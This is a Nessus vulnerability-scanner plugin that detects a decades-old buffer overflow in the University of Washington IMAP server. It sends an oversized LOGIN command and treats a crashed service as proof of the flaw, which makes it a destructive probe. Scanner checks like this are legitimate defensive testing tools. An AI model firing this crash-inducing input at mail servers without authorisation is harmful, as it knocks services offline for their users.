#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
 script_id(10125);
 script_version ("$Revision: 1.31 $");
 script_cve_id("CVE-1999-0042");
 script_osvdb_id(11731);

 script_name(english:"UoW IMAP/POP server_login() Function Remote Overflow");
 script_summary(english:"Imap buffer overflow");

  script_set_attribute(
    attribute:'synopsis',
    value:"The remote mail server is vulnerable to a buffer overflow."
  );

  script_set_attribute(
    attribute:'description',
    value:"A remote buffer overflow in this IMAP server
may allow a remote user to gain root privileges.

University of Washington IMAP server is known to be affected."
  );

  script_set_attribute(
    attribute:'solution',
    value:"Upgrade your IMAP server to the newest version available from your vendor."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");

   # http://web.archive.org/web/20040826025617/http://packetstormsecurity.nl/advisories/nai/SNI-08.IMAP_OVERFLOW.advisory  
  script_set_attribute(
    attribute:'see_also',
    value:"http://www.nessus.org/u?0d90bc64"
  );


 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1997/03/02");
 script_cvs_date("$Date: 2016/11/23 20:31:32 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/imap", 143);
  exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc: "imap", default: 143, exit_on_fail: 1);

soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

  buf = recv_line(socket:soc, length:1024);
 if(!buf)
 	{
		set_kb_item(name:"imap/false_imap", value:TRUE);
		set_kb_item(name:"imap/"+port+"/false_imap", value:TRUE);
	 	close(soc);
		exit(0);
	}


  if(" BYE " >< buf)exit(0);

data = strcat('1023 LOGIN ', crap(1023), '\r\n');
  send(socket:soc, data:data);
  buf = recv_line(socket:soc, length:1024);
  if(!buf)
  {
	close (soc);
	soc = open_sock_tcp(port);
        if (!soc)
	{
	  	security_hole(port);
		set_kb_item(name:"imap/overflow", value:TRUE);
		set_kb_item(name:"imap/"+port+"/overflow", value:TRUE);
	}
  }
  close(soc);
